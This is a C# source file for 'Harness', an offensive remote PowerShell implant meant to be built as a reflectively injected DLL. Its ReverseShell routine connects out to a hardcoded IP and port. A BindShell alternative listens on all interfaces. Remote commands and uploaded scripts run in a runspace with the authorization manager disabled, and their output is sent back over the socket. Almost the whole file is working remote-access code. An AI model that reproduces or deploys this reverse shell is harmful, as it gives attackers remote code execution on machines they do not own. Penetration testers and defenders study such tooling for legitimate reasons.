/*
 *      Copyright (c) 2015, Rich Kelley
 *      
 *      Name:  Harness
 *      
 *      Description: Harness provides a remote PowerShell interface to virtually any TCP socket.
 *                   When compiled as a reflective dll use the HARNESS_DLL directive which will replace Main with InvokePS
 *                   
 *                  ReflectiveHarness draws heavily from the following projects, and otherwise would not have been possible:
 *                  https://github.com/leechristensen/UnmanagedPowerShell/tree/master/UnmanagedPowerShell
 *                  https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/ReflectivePick
 *                  https://github.com/stephenfewer/ReflectiveDLLInjection
 *      
 *      Contact: @RGKelley5
 *               rk5devmail.com
 *               frogstarworldc.com
 *               
 *      License: MIT
 *      
 */

#define HARNESS_DLL
namespace Harness
{

    using System;
    using System.Text;
    using System.IO;
    using System.Net;
    using System.Net.Sockets;
    using System.Diagnostics;
    using System.Threading;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using PowerShell = System.Management.Automation.PowerShell;
    using PSObject = System.Management.Automation.PSObject;
    using ErrorRecord = System.Management.Automation.ErrorRecord;
    using System.Collections.Generic;
    using System.Management.Automation.Host;
    

    public class Harness
    {

        public NetworkStream stream;
        private TcpClient client;
        private bool FORMAT = true;

        private bool shouldExit;

        private int exitCode;

        private CustomPSHost host;

        private Runspace myRunSpace;

        private PowerShell ps;

        InitialSessionState state;

        private Harness()
        {

            this.host = new CustomPSHost(this);
            this.state = InitialSessionState.CreateDefault();
            this.state.AuthorizationManager = null;
            this.myRunSpace = RunspaceFactory.CreateRunspace(this.host, this.state);
            this.myRunSpace.ThreadOptions = PSThreadOptions.UseCurrentThread;
            this.myRunSpace.Open();

        }

        public bool ShouldExit
        {
            get { return this.shouldExit; }
            set { this.shouldExit = value; }
        }

        public int ExitCode
        {
            get { return this.exitCode; }
            set { this.exitCode = value; }
        }



#if HARNESS_DLL

        public static string InvokePS(string arg)
#else
        private static void Main(string[] args)

#endif
        {

            Harness hcon = new Harness();
            hcon.run();

#if HARNESS_DLL

            return " ";
#endif
        }

        private void run()
        {


            Debug.WriteLine("[DEBUG] Starting handler");

            // Define some helpful triggers and flags
            char HARNESS_CMD_CHAR = '^';
            string BEGINFILE_TAG = "<rf>";
            string ENDFILE_TAG = "</rf>";
            string USER_BREAK = "end";
            bool MULTILINE_FLAG = false;
            bool REMOTEFILE_FLAG = false;

            // Buffer for reading data 
            byte[] bytes;

            // Holds string representation of data send over the wire
            string data = "";

            // Used to accumulate data from imported file
            string data_chunk = "";

            // Replace ReverseShell() with BindShell() as needed
            this.client = ReverseShell();
            this.stream = client.GetStream();

            using (this.ps = PowerShell.Create())
            {
                while (!this.ShouldExit)
                {

                    if (stream.CanRead)
                    {

                        bytes = new byte[client.ReceiveBufferSize];

                        int i;
                        // Loop to receive all the data sent by the client.
                        while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                        {
                            // Deal with multiline script by prompting for more input (e.g. >>)
                            if (MULTILINE_FLAG)
                            {

                                data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();

                                // Check to see if the user wants to break out of multiline
                                if (data_chunk == HARNESS_CMD_CHAR + USER_BREAK)
                                {

                                    ProcessPS(data);
                                    MULTILINE_FLAG = false;
                                    data = "";
                                }
                                else
                                {
                                    data += data_chunk;
                                }

                            }
                            else if (REMOTEFILE_FLAG)
                            {
                                // Need to check and see if the script is done transfering
                                data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();

                                if (data_chunk.ToLower() == ENDFILE_TAG)
                                {

                                    Debug.WriteLine("[DEBUG] File received");

                                    if (IsValid(data))
                                    {
                                        ProcessPS(data);
                                    }
                                    else
                                    {
                                        this.host.UI.WriteLine("[!] Transfer errors found. Try import again");
                                    }

                                    data = "";
                                    REMOTEFILE_FLAG = false;
                                }
                                else
                                {
                                    data += data_chunk;
                                    data_chunk = "";
                                }

                            }
                            else
                            {

                                data = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();

                                if (data.ToLower() == "exit" || data.ToLower() == "quit") break;
                                if (data.ToLower() == BEGINFILE_TAG)
                                {

                                    Debug.WriteLine("[DEBUG] Receiving File");

                                    REMOTEFILE_FLAG = true;
                                    data = "";
                                }

                                if (data != "" && !REMOTEFILE_FLAG)
                                {

                                    Debug.WriteLine("[DEBUG] Command Received: " + data.ToString());

                                    // ProcessLocal is reserved for non-PS Harness commands that require special handling
                                    if (data[0] == HARNESS_CMD_CHAR)
                                    {

                                        ProcessLocal(data);
                                        data = "";

                                    }

                                }
                            }

                            // Determine how we deal with the data received
                            if (!REMOTEFILE_FLAG)
                            {
                                if (IsValid(data))
                                {

                                    ProcessPS(data);
                                    data = "";
                                    MULTILINE_FLAG = false;

                                }
                                else
                                {

                                    Debug.WriteLine("[DEBUG] Incomplete script or parse error");
                                    MULTILINE_FLAG = true;
                                    this.host.UI.Write(">> ");

                                }

                            }

                        }

                        // Shutdown and end connection
                        client.Close();

                        Debug.WriteLine("[DEBUG] Connection Closed");

                        break;
                    }

                }

            }

        }

        private TcpClient ReverseShell()
        {

            Debug.WriteLine("[DEBUG] InReverseShell");


            TcpClient client = new TcpClient();

            try
            {

                byte[] remoteIP = { 192, 168, 142, 129 };
                IPAddress IP = new IPAddress(remoteIP);
                client.Connect(IP, 9999);

            }
            catch (Exception err)
            {

                Debug.WriteLine("[ERROR] Connection failed!");


                System.Environment.Exit(1);

            }

            return client;

        }

        private TcpClient BindShell()
        {

            Debug.WriteLine("[DEBUG] In BindShell");

            // Create TcpListener
            byte[] localIP = { 0, 0, 0, 0 };
            IPAddress localAddr = new IPAddress(localIP);
            TcpListener server = new TcpListener(localAddr, 8000);

            // Start listening for client requests.
            server.Start();

            //perform a blocking call to accept requests.
            TcpClient client = null;

            try
            {

                client = server.AcceptTcpClient();
                return client;
            }
            catch (Exception err)
            {

                Debug.WriteLine("[ERROR] Bind failed!");
                Debug.WriteLine(err.ToString());

                System.Environment.Exit(1);
            }

            return client;
        }

        private Boolean IsValid(String data)
        {

            Debug.WriteLine("[DEBUG] In IsValid");


            Collection<PSParseError> errors = new Collection<PSParseError>();
            Collection<PSToken> tokens = PSParser.Tokenize(data, out errors);

            if (errors.Count > 0)
            {

                return false;
            }

            return true;
        }

        private void ProcessLocal(String cmd)
        {

            Debug.WriteLine("[DEBUG] In ProcessLocal");
            Debug.WriteLine(cmd);


            String results = "";

            cmd = cmd.Substring(1, cmd.Length - 1);
            cmd = cmd.ToLower();

            string[] tokens = cmd.Split(' ');
            switch (tokens[0])
            {

                case "enable-format":

                    FORMAT = true;
                    results = "[+] Formatting added";
                    break;

                case "disable-format":

                    FORMAT = false;
                    results = "[-] Formatting removed";
                    break;

            }


            this.host.UI.Write(results + "\r\n");

        }

        private void ProcessPS(String data)
        {

            Debug.WriteLine("[DEBUG] -------------Data Received---------------");
            Debug.WriteLine(data);
            Debug.WriteLine("[DEBUG] -------------End Data Received-----------");

            if (!String.IsNullOrEmpty(data))
            {

                this.ps.AddScript(data);

                // If for some reason you do not want out-string appended to the pipeline use ^disable-format command
                if (this.FORMAT)
                {
                    this.ps.AddCommand("Out-String");
                }

                Debug.WriteLine("Invoking...");

                PSDataCollection<PSObject> PSOutput = new PSDataCollection<PSObject>();
                PSOutput.DataAdded += PSOutput_DataAdded;
                ps.Streams.Error.DataAdded += Error_DataAdded;
                ps.Streams.Warning.DataAdded += Warning_DataAdded;
                ps.Streams.Verbose.DataAdded += Verbose_DataAdded;
                ps.Streams.Debug.DataAdded += Debug_DataAdded;

                // There is bug where the script freezes if errors are sent to the Error Stream. 
                // I'm not sure why it happens, but merging with the output stream is the work around for now
                this.ps.Commands.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);

                IAsyncResult async = this.ps.BeginInvoke<PSObject, PSObject>(null, PSOutput);

                while (async.IsCompleted == false)
                {
                    // not much difference between ps.Invoke(). Could be used for future feature of background jobs
                    // or possibly send status reports about the scripts progress
                }

            }

            String PSpath = ps.Runspace.SessionStateProxy.Path.CurrentFileSystemLocation.ToString();
            this.host.UI.Write("PS " + PSpath + "> ");

            ps.Commands.Clear();

        }

        private void PSOutput_DataAdded(object sender, DataAddedEventArgs e)
        {

            Debug.WriteLine("[DEBUG] New Results Added");

            PSDataCollection<PSObject> myp = (PSDataCollection<PSObject>)sender;

            Collection<PSObject> results = myp.ReadAll();
            foreach (PSObject result in results)
            {


               this.host.UI.WriteLine(result.ToString());

                
            }


        }

        private void Error_DataAdded(object sender, DataAddedEventArgs e)
        {


            Debug.WriteLine("[DEBUG] New Error Added");

            foreach (var errRecord in this.ps.Streams.Error)
            {

                this.host.UI.WriteErrorLine(errRecord.ToString() + "\r\n");


            }

            Debug.WriteLine("[DEBUG] Clearing errors");
            ps.Streams.Error.Clear();
         
        }

        private void Warning_DataAdded(object sender, DataAddedEventArgs e)
        {

            Debug.WriteLine("[DEBUG] New Warning Added");


            foreach (var warningRecord in this.ps.Streams.Warning)
            {


                this.host.UI.WriteWarningLine(warningRecord.ToString() + "\r\n");


            }

            ps.Streams.Warning.Clear();

        }

        private void Verbose_DataAdded(object sender, DataAddedEventArgs e)
        {


            Debug.WriteLine("[DEBUG] New Verbose Added");

            foreach (var verboseRecord in this.ps.Streams.Verbose)
            {

                this.host.UI.WriteVerboseLine(verboseRecord.ToString() + "\r\n");


            }

            ps.Streams.Verbose.Clear();

        }

        private void Debug_DataAdded(object sender, DataAddedEventArgs e)
        {

            Debug.WriteLine("[DEBUG] New Debug Added");


            foreach (var debugRecord in this.ps.Streams.Debug)
            {

                this.host.UI.WriteDebugLine(debugRecord.ToString() + "\r\n");


            }

            ps.Streams.Debug.Clear();

        }


        class CustomPSHost : PSHost
        {
            private Harness program;
            private Guid _hostId = Guid.NewGuid();
            private CustomPSHostUserInterface _ui;


            public CustomPSHost(Harness program)
            {
                this.program = program;
                this._ui = new CustomPSHostUserInterface(program);
            }

            public override Guid InstanceId
            {
                get { return this._hostId; }
            }

            public override string Name
            {
                get { return " "; }
            }

            public override Version Version
            {
                get { return new Version(1, 0); }
            }

            public override PSHostUserInterface UI
            {
                get { return this._ui; }
            }


            public override System.Globalization.CultureInfo CurrentCulture
            {
                get { return Thread.CurrentThread.CurrentCulture; }
            }

            public override System.Globalization.CultureInfo CurrentUICulture
            {
                get { return Thread.CurrentThread.CurrentUICulture; }
            }

            public override void EnterNestedPrompt()
            {
                throw new NotImplementedException("EnterNestedPrompt is not implemented. Yet ");
            }

            public override void ExitNestedPrompt()
            {
                throw new NotImplementedException("ExitNestedPrompt is not implemented. Yet");
            }

            public override void NotifyBeginApplication()
            {
                return;
            }

            public override void NotifyEndApplication()
            {
                return;
            }

            public override void SetShouldExit(int exitCode)
            {
                this.program.ShouldExit = true;
                this.program.ExitCode = exitCode;
                return;
            }
        }

        class CustomPSHostUserInterface : PSHostUserInterface
        {
            
            private Harness program;
            private CustomPSRHostRawUserInterface _rawUi = new CustomPSRHostRawUserInterface();

            public CustomPSHostUserInterface(Harness program)
            {
                this.program = program;
                
            }

            private void SendOutput(String output)
            {

                if (this.program.stream.CanWrite)
                {

                    Debug.WriteLine("[DEBUG] Sending: " + output.ToString());

                    Byte[] outputBytes = Encoding.UTF8.GetBytes(output.ToString());
                    this.program.stream.Write(outputBytes, 0, outputBytes.Length);

                }

            }

            public override void WriteLine()
            {
                this.SendOutput("\n");              
            }

            public override void WriteLine(string value)
            {
                this.SendOutput(value);
            }

            public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
            {
                this.SendOutput(value + "\n");             
            }

            public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
            {
                this.SendOutput(value);
            }

            public override void Write(string value)
            {
                this.SendOutput(value);             
            }

            public override void WriteDebugLine(string value)
            {
                this.SendOutput("DEBUG: " + value);           
            }

            public override void WriteErrorLine(string value)
            {
                
                this.SendOutput("ERROR: " + value);                
            }

            public override void WriteVerboseLine(string message)
            {
                this.SendOutput("VERBOSE: " + message);                
            }

            public override void WriteWarningLine(string message)
            {
                this.SendOutput("WARNING: " + message);
            }

            public override void WriteProgress(long sourceId, ProgressRecord record)
            {
                return;
            }

            public string Output
            {
                get { return " ";}
            }

            public override Dictionary<string, PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<FieldDescription> descriptions)
            {

                throw new NotImplementedException("Prompt is not implemented yet.");

            }

            public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<ChoiceDescription> choices, int defaultChoice)
            {
                throw new NotImplementedException("PromptForChoice is not implemented yet.");
            }

            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName, PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
            {
                throw new NotImplementedException("PromptForCredential1 is not implemented yet.");
            }

            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
            {
                throw new NotImplementedException("PromptForCredential2 is not implemented yet.");
            }

            public override PSHostRawUserInterface RawUI
            {
                get { return this._rawUi; }
            }

            public override string ReadLine()
            {
                throw new NotImplementedException("ReadLine is not implemented.");
            }

            public override System.Security.SecureString ReadLineAsSecureString()
            {
                throw new NotImplementedException("ReadLineAsSecureString is not implemented.");
            }
        }

        class CustomPSRHostRawUserInterface : PSHostRawUserInterface
        {

            private Size _windowSize = new Size { Width = 120, Height = 100 };

            private Coordinates _cursorPosition = new Coordinates { X = 0, Y = 0 };

            private int _cursorSize = 1;
            private ConsoleColor _foregroundColor = ConsoleColor.White;
            private ConsoleColor _backgroundColor = ConsoleColor.Black;

            private Size _maxPhysicalWindowSize = new Size
            {
                Width = int.MaxValue,
                Height = int.MaxValue
            };

            private Size _maxWindowSize = new Size { Width = 100, Height = 100 };
            private Size _bufferSize = new Size { Width = 100, Height = 1000 };
            private Coordinates _windowPosition = new Coordinates { X = 0, Y = 0 };
            private String _windowTitle = "";

            public override ConsoleColor BackgroundColor
            {
                get { return _backgroundColor; }
                set { _backgroundColor = value; }
            }

            public override Size BufferSize
            {
                get { return _bufferSize; }
                set { _bufferSize = value; }
            }

            public override Coordinates CursorPosition
            {
                get { return _cursorPosition; }
                set { _cursorPosition = value; }
            }

            public override int CursorSize
            {
                get { return _cursorSize; }
                set { _cursorSize = value; }
            }

            public override void FlushInputBuffer()
            {
                throw new NotImplementedException("FlushInputBuffer is not implemented.");
            }

            public override ConsoleColor ForegroundColor
            {
                get { return _foregroundColor; }
                set { _foregroundColor = value; }
            }

            public override BufferCell[,] GetBufferContents(Rectangle rectangle)
            {

                throw new NotImplementedException("GetBufferContents is not implemented.");
            }

            public override bool KeyAvailable
            {
                get { throw new NotImplementedException("KeyAvailable is not implemented."); }
            }

            public override Size MaxPhysicalWindowSize
            {
                get { return _maxPhysicalWindowSize; }
            }

            public override Size MaxWindowSize
            {
                get { return _maxWindowSize; }
            }

            public override KeyInfo ReadKey(ReadKeyOptions options)
            {
                throw new NotImplementedException("ReadKey is not implemented.");
            }

            public override void ScrollBufferContents(Rectangle source, Coordinates destination, Rectangle clip, BufferCell fill)
            {
                throw new NotImplementedException("ScrollBufferContents is not implemented");
            }

            public override void SetBufferContents(Rectangle rectangle, BufferCell fill)
            {
                throw new NotImplementedException("SetBufferContents is not implemented.");
            }

            public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
            {
                throw new NotImplementedException("SetBufferContents is not implemented");
            }

            public override Coordinates WindowPosition
            {
                get { return _windowPosition; }
                set { _windowPosition = value; }
            }

            public override Size WindowSize
            {
                get { return _windowSize; }
                set { _windowSize = value; }
            }

            public override string WindowTitle
            {
                get { return _windowTitle; }
                set { _windowTitle = value; }
            }
        }

    }

}


